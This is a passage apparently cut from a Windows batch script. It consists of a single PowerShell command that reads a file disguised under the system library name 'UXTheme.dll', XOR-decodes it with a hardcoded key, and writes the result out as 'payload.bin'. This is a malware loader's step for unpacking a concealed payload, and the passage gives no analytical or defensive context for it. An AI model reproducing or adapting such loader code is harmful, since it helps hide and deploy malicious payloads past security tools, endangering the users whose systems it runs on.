...
powershell -NoProfile -Command "$b=[IO.File]::ReadAllBytes('UXTheme.dll');$k=[Text.Encoding]::ASCII.GetBytes('ZhXuAkiW75wHmJAx');for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i] -bxor $k[$i %% $k.Length]};[IO.File]::WriteAllBytes('payload.bin',$b)"
